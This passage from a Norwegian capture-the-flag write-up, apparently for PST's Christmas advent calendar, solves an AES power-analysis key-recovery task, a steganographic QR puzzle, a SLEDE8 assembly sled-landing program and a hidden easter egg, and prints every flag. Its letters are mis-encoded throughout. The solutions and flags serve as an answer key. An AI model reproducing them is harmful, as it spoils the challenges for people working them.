Hva kan man lese ut der? Er det Ã¸nskeliste\[1\], \[4\] \[7\] \[8\] \[9\] og \[10\] som er av interesse her? Var en tur innom [ChipWhisperer](https://github.com/newaetech/chipwhisperer) som hadde mye interessant om temaet. Googling etter "ctf aes power analysis attack" viste at det var en populÃ¦r CTF-oppgave. [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_side_channel/) hadde bl.a. en artikkel om temaet. Til slutt endte jeg opp hos [TeamRocketIST](https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/) som hadde lÃ¸st oppgaven. Jeg kopiert rÃ¥tt og med litt skam koden og kjÃ¸rte den lokalt. Den hosta opp

```
Best Key Guess: 9dedc4e592b7c01d43667efaa74eb6e5
```

Kunne det vÃ¦re sÃ¥ enkelt, da? Ja, det var det visst

```python
from Crypto.Cipher import AES

ciphertext = "44f23b820d2240177475c36842137ca1a84de5664f6a10f9a8b2d551704cf0d078028ab2aaccf5a179a404c2b7b2e6685291fa3db038facd111484f97d54f1f6"
key = "9dedc4e592b7c01d43667efaa74eb6e5"
decrypted = AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(ciphertext))
print("".join(map(chr, decrypted)))
```

Kan selvsagt ogsÃ¥ lÃ¸ses i [CyberChef][22].

**LÃ¸sning: PST{1n_4_w0rld_th4t_sh0uts_4ll_1_n33d_1s_4_wh1sp3r!}**

# 23 - QR-koder
> Julenissens verksted pÃ¥ Nordpolen har mottatt dette julekortet. Kortet lÃ¥ ikke i konvolutt, og har ingen poststempling eller frimerker. Noen mÃ¥ altsÃ¥ ha puttet det rett i postkassa.

> Kan du undersÃ¸ke om det er noe rart med kortet?

!["julekort"](../pics/pst_23_julekort.png)

Her kom tankene raskt til steganografi. Ingen skjult tekst lot seg avekke med `zsteg`, men det finnes andre mÃ¥ter Ã¥ skjule ting i bilder. Her finnes det flere verktÃ¸y Ã¥ bruke, f.eks. [ImageMagick](https://imagemagick.org/index.php) eller [StegSolve](http://www.caesum.com/handbook/stego.htm). Jeg foretrekker det sistnevnte siden det er forholdsvis enkelt i bruk. Etter Ã¥ ha Ã¥pnet julekortet i StegSolve viste det seg raskt at det lÃ¥ ting skjult. Dette bildet lÃ¥ i [R0](https://en.wikipedia.org/wiki/Channel_(digital_image)):

!["R0"](../pics/pst_23_qr1.bmp)

En [QR-kode](https://en.wikipedia.org/wiki/QR_code) som lot seg avlese til `So close, yet so far...`. Bladde man videre, kom man til G0:

!["G0"](../pics/pst_23_qr2.bmp)

... og til slutt til B0:

!["B0"](../pics/pst_23_sjakk.bmp)

Min fÃ¸rste tanke var at de to fÃ¸rste, R0 og G0, kunne kombineres til noe, og her var jeg nede i flere kaninhull. Testet lenge med [ZXing](https://github.com/zxing/zxing) uten Ã¥ komme noen vei. Installerte deretter [GIMP](https://www.gimp.org/) som viste seg Ã¥ ha en million menyer og helt umulig Ã¥ bruke uten grundig opplÃ¦ring. I ren desperasjon fant jeg fram et rutbeark og var pÃ¥ vei til Ã¥ begynne Ã¥ tegne da `Darth Kevin` tipset om at ogsÃ¥ B0 hadde noe med saken Ã¥ gjÃ¸re. `S Claus` tipset om at StegSolve hadde muligheten til Ã¥ kombinere bilder. Om man sÃ¥ tar XOR pÃ¥ R0, G0 og B0, fÃ¥r man fram fÃ¸lgende fine QR-kode:

!["flagg"](../pics/pst_23_flagg.bmp)

Den lot seg avlese til `PST{4ll_th3s3_d3l1c10us_l4y3rs}`. 

**LÃ¸sning: PST{4ll_th3s3_d3l1c10us_l4y3rs}**
# 24 - Sledesimulator
> Testflygingen i gÃ¥r avdekket store problemer med julenissens slede. Feilen er nÃ¥ lokalisert til sledens autopilot. Som du vet er reinsdyrene satt ut av spill, sÃ¥ autopiloten mÃ¥ fungere for at det skal bli en god jul. Heldigvis er autopiloten skrevet i SLEDE8, og det kan jo du!

> Kan du utvikle en ny autopilot? Bruk det vanlige utviklingsverktÃ¸yet for SLEDE8. I tillegg kan du oppgradere til Tjenestepakke 2, hvis du ikke allerede har gjort det. Der vil du finne et simuleringsverktÃ¸y slik at du kan teste lÃ¸sningen din fÃ¸r den blir publisert til sleden.

> Alle snille barn setter nÃ¥ sin lit til deg! Lykke til!

> Autopiloten er tilstandslÃ¸s. Den leser inn relevante posisjoner som fÃ¸de, og gir fornuftig oppgulp. Dokumentasjon pÃ¥ disse er tilgjengelig i simulatoren. Oppgaven er enkel Ã¥ grei: Bestem hvilke av de tre motorene, om noen, som skal vÃ¦re aktive basert pÃ¥ forrige og nÃ¥vÃ¦rende posisjon. Eneste man mÃ¥ tenke pÃ¥ er at man mÃ¥ lande mykt nok, samt treffe mÃ¥let, slik at NISSEN kommer seg uskadet fra landingen. Kunne gjort dette i en hÃ¥ndvending selv, men er dessverre opptatt med Ã¥ spise pepperkaker.

Installering av tjenestepakken krevde gjentatte tastetrykk pÃ¥ en knapp. Eventuelt ta opp konsollet i [Chrome DevTools](https://developers.google.com/web/tools/chrome-devtools):
```
var i;for (i=0; i<100; i++) {document.getElementsByTagName('button')[4].click();}
```

Etter installering av den nevnte tjenestepakken, dukket menyvalget "Sledesimulator" opp. Det var en variant av det klassiske [Lunar Lander](https://en.wikipedia.org/wiki/Lunar_Lander_(1979_video_game))-spillet. Istedenfor Ã¥ lande et romskip pÃ¥ mÃ¥nen, skulle man lande nissen pÃ¥ ei pipe. VerktÃ¸yene man hadde tilgjengelige var en mulighet for Ã¥ "laste inn fastvare", nevnte Chrome DevTools og en "Sledesimulatorspesifikasjon":

```
Position ::= SEQUENCE {
	x INTEGER(0..255),
	y INTEGER(0..255)
}

Target ::= SEQUENCE {
	upperLeftCorner Position,
	lowerRightCorner Position
}

AutopilotFÃ¸de ::= SEQUENCE {
	currPos Position,
	prevPos Position,
	target Target
}

AutopilotOppgulp ::= SEQUENCE {
	leftThruster BOOLEAN,
	rightThruster BOOLEAN,
	verticalThruster BOOLEAN
}
```

Sledesimulatorens javascript ga en del hint om hva som var forventet input til programmet:

```javascript
function decodeOppgulp(oppgulp) {
    // const oppgulp = [0x30,0x09,0x01,0x01,0x00,0x01,0x01,0xff,0x01,0x01,0xff];
    const byte = (value) => value.toString(16).padStart(2, "0");
    const formatted = [...oppgulp].map(byte).join(""); // split 0101, i.e. single byte BOOLEAN
    const matches = formatted.match(/^30090101([0-9a-f]{2})0101([0-9a-f]{2})0101([0-9a-f]{2})$/);
    // validate output
    if ((matches === null || matches === void 0 ? void 0 : matches.length) !== 4)
        throw new Error("Ugyldig oppgulp!");
    const [leftThruster, rightThruster, verticalThruster] = matches
        .slice(1)
        .map((x) => parseInt(x, 16) > 0);
    return [leftThruster, rightThruster, verticalThruster];
}
```

Det var altsÃ¥ oppgulp fra SLEDE8 som var input til simulatoren. Og nevnte "fastvare" var da en SLEDE8-binÃ¦rfil. Regex for oppgulpet var listet i javascript-metoden over og var pÃ¥ formatet `30090101xx0101yy0101zz`. Der `xx`, `yy` og `zz` alle betegnet om en av motorene hÃ¸yre, venstre eller vertikal skulle slÃ¥s av (`00`), eller slÃ¥s pÃ¥ (et positivt hex tall, f.eks. `01`). Det ble en del testing for Ã¥ fÃ¥ oppgulp rett, men det som var verre Ã¥ forstÃ¥ var input til SLEDE8-programmet, den s.k. _fÃ¸den_. Fra javascript kunne man se at man ville fÃ¥ nÃ¥vÃ¦rende og forrige posisjon, samt koordinater for pipa nissen skulle treffe

```javascript
const encodeFÃ¸de = (input) => {
    let sequence = new asn.Sequence();
    sequence.valueBlock.value.push(encodePosition(input.pos)); // currPos
    sequence.valueBlock.value.push(encodePosition(input.prevPos)); // prevPosition
    sequence.valueBlock.value.push(encodeTarget()); // target
    return new Uint8Array(sequence.toBER());
};
```

Det viste seg at fÃ¸de kom som ASM.1 BER, noe som fÃ¸rte til at det ikke alltid var gitt hvor mange byte en posisjon brukte. Mye debugging av javascript-koden mÃ¥tte til, og funksjonen `step(executable, stdin, maxTicks = 1000)` i `index.mjs` ga nyttig informasjon. Der kunne man bl.a. se fÃ¸lgende

!["debug"](../pics/pst_24_debug.png)

Etter Ã¥ ha kikket pÃ¥ spesifikasjonen og lesing av [asn1.js](https://www.npmjs.com/package/asn1js), kom jeg fram til at index 6 var nÃ¥vÃ¦rende x-verdi, index 9 nÃ¥vÃ¦rende y-verdi, index 14 forrige x-verdi og index 17 forrige y-verdi. Disse indeksene var ikke statiske og var avhengig av stÃ¸rrelsen pÃ¥ verdien, sÃ¥ var f.eks. verdien _over_ 127, kom den over to bytes istedenfor Ã©n i eksempelet over. Og for Ã¥ oppnÃ¥ suksess, viste koden oss at fire kriterer mÃ¥tte vÃ¦re oppfylt ved landingstidspunktet  

```
108 < x < 148; x mÃ¥ vÃ¦re horisontalt pÃ¥ pipa
y > 230; y mÃ¥ vÃ¦re vertikalt pÃ¥ pipa
dy < 3; den vertikale hastigheten mÃ¥ vÃ¦re lav nok
dx < 2; den horisontale hastigheten mÃ¥ vÃ¦re lav nok
```

Det var mye prÃ¸ving og feiling for Ã¥ fÃ¥ koden rett og mitt fÃ¸rste forsÃ¸k ga bare delvis suksess

!["debug"](../pics/pst_24_kvalitetskontroll.png)

I min naivitet trodde jeg at det var tilstrekkelig Ã¥ bare lÃ¸se oppgaven for Ã©n s.k. "inngangsverdi", og jeg hadde funnet en (23) som ga veldig forutsigbar oppfÃ¸rsel. Den gang ei, koden skulle visstnok fungere for _alle_ inngangsverdier. Etter mye grubling kom jeg fram til at det som ville lÃ¸se oppgaven var Ã¥ fÃ¥ sleden inn mot midten og holde den konstant der (`x=127 og dx=0`) samtidig som nissen falt sakte mot pipa (`dy=1`). Det funka nesten alltid, men det var noen ganger nissen landa for langt mot hÃ¸yre eller venstre, sÃ¥ mÃ¥tte legge til spesialbehandling dersom det skjedde. Koden som ga flagget sÃ¥ til slutt slik ut

```
SETT r0,0; slask
SETT r3,0; xcurr
SETT r4,0; xprev
SETT r5,0; ycurr
SETT r6,0; yprev
SETT r8,1; dx max
SETT r9,2; dy max
SETT r10,0; konstant, binary off
SETT r11,1; konstant, binary on

fÃ¸de:
LES r0; SEQ 48
LES r0; total LEN, 37-38-ish

;xcurr = r3
LES r0; SEQ 48
LES r0; LEN current, 7
LES r0; 2 = INT
LES r0; LEN pÃ¥ xcurr, signifikant
LIK r0,r11; da er xcurr i neste
BHOPP lesxcurr
LES r0; else leser bort 0-verdien
lesxcurr:
LES r3; legger xcurr i r3

;ycurr = r5
LES r0; 2 = INT
LES r0; LEN pÃ¥ ycurr, signifikant
LIK r0,r11; da er ycurr i neste
BHOPP lesycurr
LES r0; else leser bort 0-verdien
lesycurr:
LES r5; legger ycurr i r5

;xprev = r4
LES r0; SEQ 48
LES r0; LEN current, 7
LES r0; 2 = INT
LES r0; LEN pÃ¥ xprev, signifikant
LIK r0,r11; da er xprev i neste
BHOPP lesxprev
LES r0; else leser bort 0-verdien
lesxprev:
LES r4; legger xprev i r4

;yprev = r6
LES r0; 2 = INT
LES r0; LEN pÃ¥ yprev, signifikant
LIK r0,r11; da er yprev i neste
BHOPP lesyprev
LES r0; else leser bort 0-verdien
lesyprev:
LES r6; legger yprev i r6

oppgulp:
SETT r0,0x30
SKRIV r0
SETT r0,0x09
SKRIV r0
SKRIV r11; 1
SKRIV r11; 1

;er vi ute pÃ¥ viddene? I sÃ¥ fall mÃ¥ vi oppover
SETT r0,230
ME r5,r0; vi er ikke forbi pipa
BHOPP thrusts; vi mÃ¥ ikke opp
SKRIV r10; 0 = left off
TUR fill
SKRIV r10; 0 = right off
TUR fill
SKRIV r11; 1 = vertical on, mÃ¥ oppover!
STOPP

thrusts:
; mÃ¥l: dx=0
SE r3,r4; vi beveger oss mot hÃ¸yre
BHOPP bevegermothÃ¸yre
ME r3,r4; vi beveger oss mot venstre
BHOPP bevegermotvenstre
; else r3=r4 og vi mÃ¥ inn mot midten
SETT r0,127
LIK r4,r0; vi er allerede pÃ¥ midten
BHOPP leftoffrightoff
ME r3,r0; xcurr er til venstre
BHOPP leftonrightoff
; else righton fordi vi er til hÃ¸yre

leftoffrighton:
SKRIV r10; 0 = left off
TUR fill
SKRIV r11; 1 = right on
TUR fill
HOPP thrustvertical

bevegermothÃ¸yre: 
SETT r0,r3
MINUS r0,r4
SEL r0,r8; da mÃ¥ vi skru pÃ¥ hÃ¸yre
BHOPP leftoffrighton

bevegermotvenstre:
SETT r0,r3
MINUS r0,r4
SEL r0,r8; da mÃ¥ vi skru pÃ¥ venstre
BHOPP leftonrightoff

leftoffrightoff:
SKRIV r10; 0 = left off
TUR fill
SKRIV r10; 0 = right off
TUR fill
HOPP thrustvertical

leftonrightoff:
SKRIV r11; 1 = left on
TUR fill
SKRIV r10; 0 = right off
TUR fill
HOPP thrustvertical

thrustvertical:
; mÃ¥l dy=1
SETT r0,127
ME r5,r0; langt opp, bare Ã¥ skru av
BHOPP verticaloff

;logikk for Ã¥ se pÃ¥ diff
SETT r0,r5; r0 er ycurr
MINUS r0,r6; diff inn i r0
LIK r0,r10; ikke sÃ¥ stor dy, kan skru av
BHOPP verticaloff
SKRIV r11; 1 = vertical on
STOPP

verticaloff:
SKRIV r10; 0 = vertical off
STOPP

fill:
SKRIV r11; 1
SKRIV r11; 1
RETUR
```

!["simulator"](../pics/pst_24_simulator.png)

Trykket man pÃ¥ `Redd julen` ble det tydeligvis kjÃ¸rt noen tester pÃ¥ inngangsverdier i bakkant, og nÃ¥r disse kjÃ¸rte ok, ble man belÃ¸nnet med fÃ¸lgende melding

!["redd julen"](../pics/pst_24_redd_jula.png)

Fulgte man URL'en, kom man til en glorete side [Arngren](http://arngren.net/) hadde blitt stolt av og som sa "Gratulerer, du reddet julen! PST{MerryChristmasYaFilthyAlgorithm}".

**LÃ¸sning: PST{MerryChristmasYaFilthyAlgorithm}**

## EggelikÃ¸r
Etter Ã¥ ha klart luke 24, kom det en melding fra Mellomleder:   
> PS: Det er totalt mulig Ã¥ fÃ¥ 11 utmerkelser.

Javel, da var det bare Ã¥ begynne Ã¥ lete. Det skulle ikke mye fantasi til for Ã¥ tenke seg at egget befant seg bak [egg.spst.no](https://egg.spst.no/). Siden utmerkelse #10 kom i luke 16, var det nÃ¦rliggende Ã¥ tro at det mÃ¥tte ligge noen hint i luke 17-23. Samtalen fra luke 17 var interessant:

```
fromTarget : ****************
toTarget : Jeg ser bare ****************
fromTarget : Oi, jeg copy/pastet passordet mitt ved en feil. 
fromTarget : Bra det ble sladdet
toTarget : jeger2
```

PrÃ¸vde fÃ¸rst `jeger2`, som ikke funket. Men `****************` funket fint og man ble videresendt til https://egg.spst.no/c9ac37f8b4a4d689456d756485428522/. Der stod egget i klartekst.

**Utmerkelse #11: EGG{AllIWantForChristmasIsPfeffErminZ}**

# Hilsen fra Julenissen
> KjÃ¦re âœ… waperon   
> Takket vÃ¦re deg er julen reddet! Tusen takk for innsatsen!
> Jeg vil pÃ¥ vegne av hele NPST og vÃ¥r samarbeidsparner PST Ã¸nske deg en riktig god jul!
> ğŸ…

Bare hyggelig, nissefar. Skulle bare mangle.

!["final socreboard"](../pics/pst_scoreboard_final.png)

[1]: https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,24)&input=UlVWe0pna0pxUOVHdEZndkx3bktpbGdwfQ   
[5]: https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-16LE%20(1200)')URL_Decode()   
[17]: https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'24'%7D,'Standard',false)&input=NjM0QjQwMDQ0RjUyNDE0ODQwMDU
[181]: https://gchq.github.io/CyberChef/#recipe=To_Hex('Space',0)&input=8J%2BQpw
[182]: https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Base64('A-Za-z0-9-_')&input=ZjA5ZjkwYTc
[183]: https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)&input=ODAgODMgODQgMTIzIDY5IDExOCAxMDEgMTE0IDEyMSAxMTEgMTEwIDEwMSA2NSA5OCAxMTEgOTcgMTE0IDEwMCA4NCAxMDQgMTAxIDc4IDc5IDgwIDY5IDgzIDEwOCAxMDEgMTAwIDEwMSA1NiAxMjU
[22]: http://icyberchef.com/#recipe=AES_Decrypt(%7B'option':'Hex','string':'9dedc4e592b7c01d43667efaa74eb6e5'%7D,%7B'option':'Hex','string':''%7D,'ECB','Hex','Raw',%7B'option':'Hex','string':''%7D)&input=NDRmMjNiODIwZDIyNDAxNzc0NzVjMzY4NDIxMzdjYTFhODRkZTU2NjRmNmExMGY5YThiMmQ1NTE3MDRjZjBkMDc4MDI4YWIyYWFjY2Y1YTE3OWE0MDRjMmI3YjJlNjY4NTI5MWZhM2RiMDM4ZmFjZDExMTQ4NGY5N2Q1NGYxZjY